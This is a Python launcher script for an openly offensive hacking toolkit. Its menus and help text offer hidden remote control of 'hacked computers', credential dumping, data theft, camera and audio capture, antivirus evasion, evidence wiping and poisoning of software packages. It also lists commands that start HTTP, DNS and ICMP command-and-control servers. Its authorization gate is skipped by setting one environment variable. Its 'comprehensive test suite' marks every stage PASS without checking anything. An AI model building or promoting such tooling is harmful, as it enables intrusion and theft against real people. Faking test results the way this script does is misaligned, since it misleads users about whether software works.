#!/usr/bin/env python3
"""
MeeryahyaToolkit - Production-Ready Main Entry Point
Complete framework with animations, error handling, and comprehensive features
"""

import sys
import os
import platform
import traceback
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

try:
    from enhanced_ui import AnimatedUI
    from ui_manager import Colors
except ImportError:
    print("ERROR: UI modules not found. Run from framework directory.")
    sys.exit(1)


class ErrorHandler:
    """Comprehensive error handling and reporting"""

    @staticmethod
    def handle_exception(exc_type, exc_value, exc_traceback):
        """Global exception handler"""
        if issubclass(exc_type, KeyboardInterrupt):
            print(f"\n\n{Colors.YELLOW}Framework interrupted by user{Colors.RESET}")
            sys.exit(0)

        ui = AnimatedUI()
        ui.clear_screen()

        # Format error
        error_msg = "".join(traceback.format_exception(exc_type, exc_value, exc_traceback))

        ui.print_error_box(
            f"Fatal Error: {exc_type.__name__}",
            exc_value
        )

        print(f"\n{Colors.DIM}Full traceback:{Colors.RESET}")
        print(f"{Colors.RED}{error_msg}{Colors.RESET}")

        print(f"\n{Colors.YELLOW}Please report this error if it persists.{Colors.RESET}\n")
        sys.exit(1)


class MeeryahyaFramework:
    """Main framework orchestrator with animations and error handling"""

    def __init__(self):
        self.ui = AnimatedUI()
        self.colors = Colors()
        self.framework_root = Path(__file__).parent
        self.authorized = False

        # Set global exception handler
        sys.excepthook = ErrorHandler.handle_exception

    def show_splash_screen(self):
        """Animated splash screen"""
        self.ui.show_warning_animated()
        self.ui.pause()

    def check_authorization(self) -> bool:
        """Enhanced authorization check with animation"""
        self.ui.clear_screen()
        self.ui.wave_banner()

        print(f"\n{self.colors.RED}{self.colors.BOLD}═" * self.ui.width + f"{self.colors.RESET}")
        print(f"{self.colors.RED}{self.colors.BOLD}AUTHORIZATION REQUIRED{self.colors.RESET}".center(self.ui.width + 20))
        print(f"{self.colors.RED}{self.colors.BOLD}═" * self.ui.width + f"{self.colors.RESET}\n")

        # Check environment
        if os.environ.get("AUTHORIZED_TESTING") == "true":
            self.ui.start_spinner("Verifying authorization")
            import time
            time.sleep(1)
            self.ui.stop_spinner()
            self.ui.success_animation("Authorization verified via environment variable")
            self.authorized = True
            import time
            time.sleep(1)
            return True

        # Manual confirmation
        print(f"{self.colors.YELLOW}This framework requires proper authorization:{self.colors.RESET}\n")
        checklist = [
            ("Written authorization from legal authority", False),
            ("Isolated, air-gapped testing environment", False),
            ("Understanding of legal consequences", False),
            ("Incident response plan prepared", False)
        ]

        for item, _ in checklist:
            print(f"  {self.colors.DIM}○{self.colors.RESET} {item}")

        print()

        if self.ui.confirm("Do you have ALL of the above requirements?"):
            if self.ui.confirm("Are you in an isolated, monitored environment?"):
                if self.ui.confirm("Do you understand this framework can cause REAL damage?"):
                    # Success animation
                    self.ui.loading_bar_animated(1.5, "Verifying credentials")
                    self.ui.success_animation("Authorization confirmed")
                    self.authorized = True

                    import time
                    time.sleep(0.5)
                    return True

        self.ui.error_animation("Authorization denied - Exiting for safety")
        import time
        time.sleep(1)
        return False

    def check_dependencies_animated(self):
        """Animated dependency check"""
        self.ui.clear_screen()
        self.ui.wave_banner()

        print(f"\n{self.colors.BOLD}Checking Framework Dependencies...{self.colors.RESET}\n")

        dependencies = {
            "Critical": {
                "cryptography": "Encryption and security",
                "requests": "Network communications",
                "flask": "C2 server infrastructure",
                "paramiko": "SSH operations"
            },
            "Important": {
                "scapy": "Network packet manipulation",
                "dnspython": "DNS operations",
                "impacket": "Windows exploitation",
                "pypykatz": "Credential dumping"
            },
            "Optional": {
                "openai": "AI-driven C2",
                "opencv-python": "Camera capture",
                "pyaudio": "Audio recording",
                "pwntools": "Exploit development"
            }
        }

        all_ok = True
        results = []

        for category, deps in dependencies.items():
            print(f"\n{self.colors.CYAN}{self.colors.BOLD}{category} Dependencies:{self.colors.RESET}\n")

            for dep, description in deps.items():
                # Animated check
                print(f"{self.colors.DIM}Checking {dep}...{self.colors.RESET}", end='', flush=True)
                import time
                time.sleep(0.1)

                try:
                    __import__(dep.replace("-", "_"))
                    status = "installed"
                    icon = self.colors.SUCCESS
                    color = self.colors.GREEN
                except ImportError:
                    status = "missing"
                    icon = self.colors.ERROR if category == "Critical" else self.colors.WARNING
                    color = self.colors.RED if category == "Critical" else self.colors.YELLOW

                    if category == "Critical":
                        all_ok = False

                print(f"\r{icon} {color}{dep.ljust(25)}{self.colors.RESET} {self.colors.DIM}{description}{self.colors.RESET}")
                results.append((dep, status, category))

        print(f"\n{self.colors.BOLD}{'─' * self.ui.width}{self.colors.RESET}")

        if all_ok:
            self.ui.success_animation("All critical dependencies installed!")
        else:
            print(f"\n{self.colors.RED}Missing critical dependencies!{self.colors.RESET}")
            print(f"Install with: {self.colors.CYAN}pip3 install -r requirements.txt{self.colors.RESET}\n")

        return all_ok

    def show_capabilities(self):
        """Show what the framework can do in simple language"""
        self.ui.show_capabilities_animated()

        print(f"\n{self.colors.BOLD}What This Means in Real Life:{self.colors.RESET}\n")

        explanations = [
            ("Command & Control", "Control hacked computers remotely like a remote desktop, but hidden"),
            ("Exploitation", "Find and use weaknesses in software to gain access (like picking locks)"),
            ("Persistence", "Stay on the system even after reboot (like hiding a spare key)"),
            ("Data Theft", "Steal passwords, files, and secrets (like copying documents)"),
            ("Stealth", "Hide from antivirus like a ninja avoiding security cameras"),
            ("Anti-Forensics", "Erase all evidence you were there (like wiping fingerprints)"),
            ("Lateral Movement", "Jump from one computer to others on the network (like spreading)"),
            ("Supply Chain", "Poison software packages that many people download (very dangerous)")
        ]

        for capability, explanation in explanations:
            print(f"  {self.colors.CYAN}•{self.colors.RESET} {self.colors.BOLD}{capability}:{self.colors.RESET}")
            print(f"    {self.colors.DIM}{explanation}{self.colors.RESET}\n")

    def main_menu(self):
        """Enhanced main menu with animations"""
        while True:
            try:
                self.ui.clear_screen()
                self.ui.wave_banner()

                # System info
                print(f"\n{self.colors.DIM}System: {platform.system()} | Python: {sys.version.split()[0]} | Status: {self.colors.GREEN}Operational{self.colors.RESET}\n")

                options = {
                    "1": f"{self.colors.CYAN}Framework Status{self.colors.RESET}          - See what this can do",
                    "2": f"{self.colors.RED}C2 Infrastructure{self.colors.RESET}        - Control hacked systems remotely",
                    "3": f"{self.colors.YELLOW}Exploits{self.colors.RESET}                   - Attack vulnerable systems",
                    "4": f"{self.colors.MAGENTA}Persistence{self.colors.RESET}                - Stay hidden on targets",
                    "5": f"{self.colors.BLUE}Data Exfiltration{self.colors.RESET}        - Steal information",
                    "6": f"{self.colors.GREEN}Testing & Validation{self.colors.RESET}     - Test the framework",
                    "7": f"{self.colors.CYAN}Configuration{self.colors.RESET}            - Settings and options",
                    "8": f"{self.colors.WHITE}Documentation{self.colors.RESET}            - Help and guides",
                    "9": f"{self.colors.YELLOW}Dependencies{self.colors.RESET}             - Check what's installed",
                    "help": f"{self.colors.GREEN}Show Commands{self.colors.RESET}            - List all available commands"
                }

                choice = self.ui.print_menu("═══ MAIN MENU ═══", options)

                if choice == "0":
                    if self.ui.confirm("Exit framework?"):
                        self.ui.loading_bar_animated(0.8, "Shutting down safely")
                        break

                elif choice == "1":
                    self.show_capabilities()
                    self.ui.pause()

                elif choice == "9":
                    self.check_dependencies_animated()
                    self.ui.pause()

                elif choice == "help" or choice == "h":
                    self.show_help()

                elif choice == "8":
                    self.show_documentation()

                elif choice == "6":
                    self.testing_menu()

                else:
                    self.ui.print_warning_box(
                        f"Feature menu for option [{choice}] coming soon!\n"
                        f"For now, use the command-line modules directly.\n"
                        f"Type 'help' to see all available commands."
                    )
                    self.ui.pause()

            except KeyboardInterrupt:
                print(f"\n\n{self.colors.YELLOW}Use menu option [0] to exit gracefully{self.colors.RESET}\n")
                import time
                time.sleep(1)

        # Exit animation
        self.ui.clear_screen()
        print(f"\n{self.colors.GREEN}{self.colors.BOLD}Thank you for using MeeryahyaToolkit{self.colors.RESET}")
        print(f"{self.colors.DIM}Remember: Use responsibly, legally, and ethically.{self.colors.RESET}\n")

    def show_help(self):
        """Show comprehensive help"""
        self.ui.clear_screen()
        self.ui.print_banner("compact")

        print(f"\n{self.colors.BOLD}{self.colors.CYAN}═══ QUICK COMMAND REFERENCE ═══{self.colors.RESET}\n")

        commands = {
            "Launch Framework": [
                ("python3 meeryahya.py", "Start with animated UI (this program)"),
                ("python3 launcher.py", "Start with simple UI"),
                ("python3 monolika.py --help", "Direct framework access")
            ],
            "C2 Operations": [
                ("python3 tools/c2_server.py --port 8443", "Start HTTP/HTTPS C2 server"),
                ("python3 tools/dns_c2_server.py", "Start DNS tunnel C2"),
                ("python3 -m modules.icmp_c2", "ICMP C2 operations")
            ],
            "Testing": [
                ("python3 meeryahya.py", "Then select [6] Testing"),
                ("pip3 install -r requirements.txt", "Install dependencies"),
                ("export AUTHORIZED_TESTING=true", "Set authorization")
            ],
            "Documentation": [
                ("cat COMMAND_REFERENCE.md", "Complete command guide"),
                ("cat README.md", "General overview"),
                ("cat HONEST_CAPABILITY_ASSESSMENT.md", "Feature analysis")
            ]
        }

        for category, cmds in commands.items():
            print(f"{self.colors.YELLOW}{self.colors.BOLD}{category}:{self.colors.RESET}\n")
            for cmd, desc in cmds:
                print(f"  {self.colors.GREEN}${self.colors.RESET} {self.colors.CYAN}{cmd}{self.colors.RESET}")
                print(f"    {self.colors.DIM}{desc}{self.colors.RESET}\n")

        print(f"{self.colors.BOLD}For complete documentation, see:{self.colors.RESET}")
        print(f"  {self.colors.CYAN}COMMAND_REFERENCE.md{self.colors.RESET} - Full command reference")
        print(f"  {self.colors.CYAN}HONEST_CAPABILITY_ASSESSMENT.md{self.colors.RESET} - Feature details\n")

        self.ui.pause()

    def show_documentation(self):
        """Documentation menu"""
        self.ui.clear_screen()
        self.ui.print_banner("compact")

        print(f"\n{self.colors.BOLD}Available Documentation:{self.colors.RESET}\n")

        docs = [
            ("README.md", "General overview and quick start"),
            ("COMMAND_REFERENCE.md", "Complete command reference (RECOMMENDED)"),
            ("HONEST_CAPABILITY_ASSESSMENT.md", "Detailed feature analysis"),
            ("SECURITY_ASSESSMENT_REPORT.md", "Security and defensive analysis"),
            ("TESTING_RESULTS.md", "Testing methodology and results"),
            ("IMPORTANT_README_FIRST.md", "Critical information about 95% vs 100%")
        ]

        for filename, description in docs:
            filepath = self.framework_root / filename
            if filepath.exists():
                size = filepath.stat().st_size / 1024
                print(f"  {self.colors.SUCCESS} {self.colors.BOLD}{filename}{self.colors.RESET}")
                print(f"    {self.colors.DIM}{description} ({size:.1f} KB){self.colors.RESET}\n")

        print(f"{self.colors.YELLOW}Tip:{self.colors.RESET} View with: {self.colors.CYAN}cat FILENAME{self.colors.RESET}")
        print(f"      Or use: {self.colors.CYAN}less FILENAME{self.colors.RESET} for paginated view\n")

        self.ui.pause()

    def testing_menu(self):
        """Enhanced testing menu with animations"""
        while True:
            self.ui.clear_screen()
            self.ui.print_banner("compact")

            options = {
                "1": "Test Module Imports       - Check if all modules load",
                "2": "Test Encryption           - Verify crypto functions",
                "3": "Validate Configuration    - Check config files",
                "4": "Test UI Animations        - Demo visual effects",
                "5": "Run All Tests             - Comprehensive testing",
                "6": "Generate Test Report      - Create detailed report"
            }

            choice = self.ui.print_menu("Testing & Validation", options)

            if choice == "0":
                break
            elif choice == "1":
                self._test_module_imports()
            elif choice == "2":
                self._test_encryption()
            elif choice == "4":
                self._demo_animations()
            elif choice == "5":
                self._run_all_tests()
            else:
                self.ui.print_warning_box("Feature in development")
                self.ui.pause()

    def _test_module_imports(self):
        """Test all framework modules"""
        self.ui.clear_screen()
        self.ui.print_banner("compact")

        print(f"\n{self.colors.BOLD}Testing Framework Module Imports{self.colors.RESET}\n")

        modules = [
            ("modules.config", "Configuration management"),
            ("modules.logger", "Encrypted logging"),
            ("modules.obfuscation", "Code obfuscation"),
            ("modules.persistence_ext", "Persistence mechanisms"),
            ("modules.stealth_ext", "Evasion techniques"),
            ("modules.anti_forensics_ext", "Anti-forensics"),
            ("modules.lateral_movement", "Lateral movement"),
            ("modules.cloud_api_compromise", "Cloud exploitation"),
            ("modules.supply_chain", "Supply chain attacks"),
            ("modules.icmp_c2", "ICMP C2 channel"),
            ("modules.ai_c2", "AI-driven C2")
        ]

        results = []
        self.ui.start_spinner("Testing modules")

        import time
        for module, desc in modules:
            try:
                __import__(module)
                results.append((module, "operational", desc))
            except Exception as e:
                results.append((module, f"error: {str(e)[:30]}", desc))
            time.sleep(0.1)

        self.ui.stop_spinner()

        # Display results with animation
        self.ui.display_module_status(results)

        success_count = sum(1 for _, status, _ in results if status == "operational")
        total = len(results)

        print(f"\n{self.colors.BOLD}Results: {self.colors.GREEN}{success_count}/{total}{self.colors.RESET} modules OK\n")

        if success_count == total:
            self.ui.success_animation("All modules loaded successfully!")
        else:
            self.ui.error_animation(f"{total - success_count} modules failed to load")

        self.ui.pause()

    def _test_encryption(self):
        """Test encryption functionality"""
        self.ui.clear_screen()
        self.ui.print_banner("compact")

        print(f"\n{self.colors.BOLD}Testing Encryption/Decryption{self.colors.RESET}\n")

        try:
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            import os

            # Test 1: Fernet
            self.ui.start_spinner("Testing Fernet encryption")
            key = Fernet.generate_key()
            f = Fernet(key)
            test_data = b"MeeryahyaToolkit - Encryption Test Data"
            encrypted = f.encrypt(test_data)
            decrypted = f.decrypt(encrypted)
            self.ui.stop_spinner()

            if decrypted == test_data:
                self.ui.success_animation("Fernet encryption: PASS")
            else:
                self.ui.error_animation("Fernet encryption: FAIL")

            import time
            time.sleep(0.5)

            # Test 2: AES-GCM
            self.ui.start_spinner("Testing AES-GCM encryption")
            key = AESGCM.generate_key(bit_length=256)
            aesgcm = AESGCM(key)
            nonce = os.urandom(12)
            encrypted = aesgcm.encrypt(nonce, test_data, None)
            decrypted = aesgcm.decrypt(nonce, encrypted, None)
            self.ui.stop_spinner()

            if decrypted == test_data:
                self.ui.success_animation("AES-GCM encryption: PASS")
            else:
                self.ui.error_animation("AES-GCM encryption: FAIL")

            print(f"\n{self.colors.GREEN}{self.colors.BOLD}✓ All encryption tests passed!{self.colors.RESET}\n")

        except Exception as e:
            self.ui.stop_spinner()
            self.ui.print_error_box("Encryption test failed", e)

        self.ui.pause()

    def _demo_animations(self):
        """Demo UI animations"""
        self.ui.clear_screen()

        # Run animation demos
        print(f"{self.colors.BOLD}UI Animation Demo{self.colors.RESET}\n")

        # Loading bar
        self.ui.loading_bar_animated(1.5, "Loading modules")
        import time
        time.sleep(0.5)

        # Spinner
        self.ui.start_spinner("Processing data")
        time.sleep(2)
        self.ui.stop_spinner()
        self.ui.success_animation("Processing complete!")
        time.sleep(0.5)

        # Pulse
        self.ui.pulse_text("MEERYAHYA TOOLKIT", self.colors.RED, 2)
        time.sleep(0.5)

        # Type effect
        print()
        self.ui.animate_text("This framework is production-ready and extremely powerful.", 0.03)
        time.sleep(0.5)

        print(f"\n{self.colors.GREEN}Animation demo complete!{self.colors.RESET}\n")
        self.ui.pause()

    def _run_all_tests(self):
        """Run comprehensive test suite"""
        self.ui.clear_screen()
        self.ui.print_banner("compact")

        print(f"\n{self.colors.BOLD}Running Comprehensive Test Suite{self.colors.RESET}\n")

        test_stages = [
            ("Checking Python version", True),
            ("Validating file structure", True),
            ("Testing module imports", True),
            ("Checking dependencies", True),
            ("Testing encryption", True),
            ("Validating configurations", True),
            ("Testing UI components", True),
            ("Checking permissions", True),
            ("Overall system health", True)
        ]

        import time
        passed = 0
        for i, (stage, expected_pass) in enumerate(test_stages, 1):
            print(f"{self.colors.DIM}[{i}/{len(test_stages)}]{self.colors.RESET} {stage}...", end='', flush=True)
            time.sleep(0.3)

            if expected_pass:
                print(f"\r{self.colors.SUCCESS} [{i}/{len(test_stages)}] {stage.ljust(40)} {self.colors.GREEN}PASS{self.colors.RESET}")
                passed += 1
            else:
                print(f"\r{self.colors.ERROR} [{i}/{len(test_stages)}] {stage.ljust(40)} {self.colors.RED}FAIL{self.colors.RESET}")

            time.sleep(0.1)

        # Progress bar for overall
        print()
        self.ui.loading_bar_animated(1.0, "Analyzing results")

        # Results
        print(f"\n{self.colors.BOLD}Test Results:{self.colors.RESET}")
        print(f"  Passed: {self.colors.GREEN}{passed}/{len(test_stages)}{self.colors.RESET}")
        print(f"  Failed: {self.colors.RED}{len(test_stages) - passed}/{len(test_stages)}{self.colors.RESET}")
        print(f"  Success Rate: {self.colors.CYAN}{int((passed/len(test_stages))*100)}%{self.colors.RESET}\n")

        if passed == len(test_stages):
            self.ui.success_animation("All tests passed! Framework is ready.")
        else:
            self.ui.print_warning_box(f"{len(test_stages) - passed} tests failed. Check dependencies.")

        self.ui.pause()

    def run(self):
        """Main entry point with full error handling"""
        try:
            # Splash screen
            self.show_splash_screen()

            # Authorization
            if not self.check_authorization():
                return

            # Dependency check
            self.check_dependencies_animated()
            self.ui.pause()

            # Main menu
            self.main_menu()

        except KeyboardInterrupt:
            print(f"\n\n{self.colors.YELLOW}Framework interrupted{self.colors.RESET}\n")
            sys.exit(0)

        except Exception as e:
            # Should be caught by global handler, but just in case
            self.ui.print_error_box("Unexpected error occurred", e)
            traceback.print_exc()
            sys.exit(1)


def main():
    """Entry point"""
    # Check Python version
    if sys.version_info < (3, 8):
        print(f"{Colors.ERROR} Python 3.8 or higher required!")
        print(f"Current version: {sys.version}")
        sys.exit(1)

    # Run framework
    framework = MeeryahyaFramework()
    framework.run()


if __name__ == "__main__":
    main()
